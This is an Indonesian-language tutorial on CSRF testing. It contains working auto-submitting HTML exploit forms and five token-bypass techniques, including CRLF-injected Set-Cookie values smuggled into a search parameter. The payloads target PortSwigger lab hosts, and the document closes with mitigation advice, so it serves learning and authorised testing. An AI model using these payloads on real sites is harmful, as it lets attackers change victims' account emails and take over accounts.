# Cross-Site Request Forgery (CSRF)
## Definisi

*Cross-Site Request Forgery* atau CSRF merupakan sebuah kerentanan keamanan pada aplikasi web yang membuat penyerang dapat mengarahkan pengguna untuk melakukan beberapa hal yang seharusnya tidak ingin mereka lakukan. 

Berikut merupakan **TIGA** kondisi yang harus ada untuk memungkinkan terjadinya serangan/kerentanan CSRF:

- Terdapat fitur untuk mengganti data diri, seperti **password**, **username**, **profile picture**, dan lain sebagainya yang dapat memungkinkan pengguna ataupun user lain untuk mengganti data sendiri maupun orang lain.
- Terdapat **Cookie** yang digunakan untuk **session handling**, dan tidak terdapat token **anti-csrf**.
- Tidak terdapat parameter yang bisa ditebak oleh penyerang pada **request** yang ada. Sebagai contoh apabila ingin mengganti password, penyerang diharuskan memiliki password yang lama terlebih dahulu. (Validasi Password/ID)

Berikut merupakan **payload** yang bisa dipakai untuk melakukan submit request, apabila payload ini berhasil, maka web tersebut memiliki kerentanan CSRF. 
```markdown
<html>
    <body>
      <form action="https://vulnerable-website.com/email/change" method="POST">
         <input type="hidden" name="email" value="pwned@evil-user.net" />
      </form>
      <script>
          document.forms[0].submit();
      </script>
    </body>
</html>
```

## Pengujian CSRF
### Step Umum:
```markdown
1. Pilih request apapun yang ingin anda uji atau eksploit (saran: Gunakan Burpsuite Professional)
2. Klik kanan pada request tersebut dan klik Engagement Tools / Generate CSRF PoC.
3. Secara otomatis Burpsuite akan membuat payload untuk melakukan serangan CSRF.
4. Anda dapat mengubah payload tersebut sesuai dengan kebutuhan agar bisa berfungsi dengan baik.
5. Copy HTML yang sudah dibuat oleh Burpsuite ke web page, kemudian lihat pada prowser apakah request tersebut dapat mempengaruhi web aslinya (seperti password sudah terganti, dsbnya) atau tidak.
```

### Metode Bypass 1 : mengubah metode *request* `POST` → `GET`

```markdown
Skenario : Validasi terhadap CSRF token bergantung terhadap metode request

1. Lakukan interaksi terhadap beberapa fungsi dan Intercept request yang ada.
2. Kirim request tersebut ke repeater dan klik kanan untuk mengganti metode request-nya.
3. Hapus semua parameter csrf yang ada pada request, lalu klik Generate CSRF PoC.
4. Edit sesuai dengan kebutuhan, sebagai contoh:

<!DOCTYPE html>
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
	<form method="GET" action="https://ac591fd21f4ab3d2807a1b1d0007000d.web-security-academy.net:443/email/change-email?email=rad1ly%40hack.com">
		<input type="text" name="email" value="rad1zly@hack.com">
	</form>
<script>
      document.forms[0].submit();
    </script>
</body>
</html>

5. Kemudian kirim html tersebut atau buka pada website dan klik submit.
6. Lihat apa yang terjadi pada akun tersebut.
```

### Metode Bypass 2: Menghapus parameter CSRF dari request `POST`.

```markdown
Skenario : Validasi terhadap CSRF token bergantung terhadap ada tidaknya token tersebut di request.

1. Lakukan interaksi terhadap beberapa fungsi dan Intercept request yang ada.
2. Kirim request tersebut ke repeater.
3. Hapus semua parameter csrf yang ada pada request, lalu klik Generate CSRF PoC.
4. Edit sesuai dengan kebutuhan, sebagai contoh:

<!DOCTYPE html>
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
	<form method="POST" action="https://ac8a1fbd1e6d76ae806817f900d50032.web-security-academy.net:443/email/change-email">
		<input type="text" name="email" value="rad1zly@hack.com">
	</form>
<script>
      document.forms[0].submit();
    </script>
</body>
</html>

5. Kemudian kirim html tersebut atau buka pada website dan klik submit.
6. Lihat apa yang terjadi pada akun tersebut.
```

### Bypass Method - 3: Generate CSRF Token sendiri. 

```markdown
Skenario : Token CSRF tidak tersambung dengan sesi pengguna.

1. Lakukan interaksi terhadap beberapa fungsi dan Intercept request yang ada.
2. Generate CSRF PoC.
3. Copy kode yang di generate ke sebuah file html dan hapus session token (bila ada).
4. Drop request yang ada pada burpsuite.
5. Kemudian kirim html tersebut atau buka pada website dan klik submit.
6. Lihat apa yang terjadi pada akun tersebut.

Contoh Kode CSRF:

<!DOCTYPE html>
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
	<form method="POST" action="https://acd81f251e0c762980c31ae600c70041.web-security-academy.net:443/email/change-email">
		<input type="text" name="email" value="rad1zly@hack.com">
		<input type="text" name="csrf" value="NqdmYFyfHgQl8JWLKd7YTOC24Tqdedpw">
	</form>
<script>
      document.forms[0].submit();
    </script>
</body>
</html>

```

### Metode Bypass 4 : Kombinasikan kerentanan lain untuk menambahkan cookie buatan sendiri, contohnya dengan menggunakan `XSS`, `CRLF` → `CSRF`

```markdown
Skenario 1 : Token CSRF terikat ke cookie non-sesi, ketika memiliki dua csrf, token satu di cookie dan lainnya dalam fungsionalitas, ini karena adanya dua kerangka kerja. satu untuk penanganan sesi dan satu untuk perlindungan CSRF, yang tidak terintegrasi satu sama lain.
                

1. Temukan kerentanan yang memungkinkan kita untuk menginjeksi cookie.
2. Lakukan pengujian jika CSRF token terikat dengan session id atau tidak (dengan mencoba mengubah session id)
3. Cek jika CSRF token yang dibuat berfungsi saat menggantikan token CSRF yang asli.
4. Cek apabila bisa melakukan injeksi CRLF dan ubah nilai CSRF cookie tersebut. 
5. Kemudian buat payload dan kirimkan payload tersebut.

Contoh payload:

<!DOCTYPE html>
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
	<form method="POST" action="https://ac981fc81ee9f58b80984ae400200076.web-security-academy.net:443/my-account/change-email">
		<input type="text" name="csrfKey" value="ntq9GTrV4JhtLaX07sqTnMpOHwMGpaX9">
		<input type="text" name="email" value="rad1zly@hack.com">
		<input type="text" name="csrf" value="6EU5SJ9YKzfOsq9rNgDR8toGy0TKSw81">
		<input type="submit" value="Send">
	</form>
<img src="http://ac981fc81ee9f58b80984ae400200076.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ntq9GTrV4JhtLaX07sqTnMpOHwMGpaX9" onerror="document.forms[0].submit()">
</body>
</html>


Skenario 2 : Token CSRF hanya diduplikasi dalam cookie, di sini nilai token csrf bisa apa saja hanya perlu sama di cookie dan juga parameternya.

1. Intercept request dan coba ubah CSRF token pada cookie dan parameternya.
2. Buat PoC yang mirip seperti diatas namun kali ini masukan token CSRF yang sama di payload CRLF dan Request parameternya.
3. Kemudian kirim html tersebut atau buka pada website dan klik submit.
4. Lihat apa yang terjadi pada akun tersebut.

Contoh payload:

<!DOCTYPE html>
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
	<form method="POST" action="https://ac071f601e8dc74380609c1d000900b3.web-security-academy.net:443/my-account/change-email">
		<input type="text" name="csrf" value="K5r92qL9pGzpC2joPMkqgBSY1GG3eo6I">
		<input type="text" name="session" value="xdCFpxBe1M0MHvk0DmFuzCRlImMgdxZk">
		<input type="text" name="email" value="rad1zly@hack.com">
		<input type="text" name="csrf" value="fake">
		<input type="submit" value="Send">
	</form>
<img src="http://ac071f601e8dc74380609c1d000900b3.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit()">
</body>
</html>

```

### Metode Bypass 5: Mengirimkan nilai `null` pada token CSRF.

```markdown
Skenario: Validasi token CSRF tergantung pada nilai token yang ada.

1. Lakukan interaksi terhadap beberapa fungsi dan Intercept request yang ada.
2. Kirim request tersebut ke repeater.
3. tambahkan null parameter dan generate CSRF PoC
4. Edit html sesuai kebutuhan, contoh:

<!DOCTYPE html>
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
	<form method="POST" action="https://ac8a1fbd1e6d76ae806817f900d50032.web-security-academy.net:443/email/change-email">
		<input type="text" name="email" value="rad1zly@hack.com">
	</form>
<script>
      document.forms[0].submit();
    </script>
</body>
</html>

5. Kemudian kirim html tersebut atau buka pada website dan klik submit.
6. Lihat apa yang terjadi pada akun tersebut.
```

## Mitigasi    
Menggunakan Token CSRF     
Cara paling kuat untuk bertahan dari serangan CSRF adalah dengan menyertakan [CSRF token](https://portswigger.net/web-security/csrf/tokens) dalam request yang relevan. Tokennya harus:  
- Tidak dapat diprediksi dengan entropi tinggi, seperti token sesi pada umumnya.
- Terikat dengan sesi pengguna.
- Divalidasi secara ketat dalam setiap kasus sebelum tindakan yang relevan dijalankan.
    

## Referensi

[What is CSRF (Cross-site request forgery)? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/csrf)

[Top 25 CSRF Bug Bounty Reports](https://corneacristian.medium.com/top-25-csrf-bug-bounty-reports-ffb0b61afa55)

[KathanP19/HowToHunt](https://github.com/KathanP19/HowToHunt/blob/master/CSRF/Cross_Site_Request_Forgery_Bypass.md)

- Beberapa Ceklist
    
![https://pbs.twimg.com/media/ER_exjuU4AIDHzs?format=png&name=900x900](https://pbs.twimg.com/media/ER_exjuU4AIDHzs?format=png&name=900x900)
    

![https://pbs.twimg.com/media/EsAj4HTW8AIk9rZ?format=jpg&name=900x900](https://pbs.twimg.com/media/EsAj4HTW8AIk9rZ?format=jpg&name=900x900)
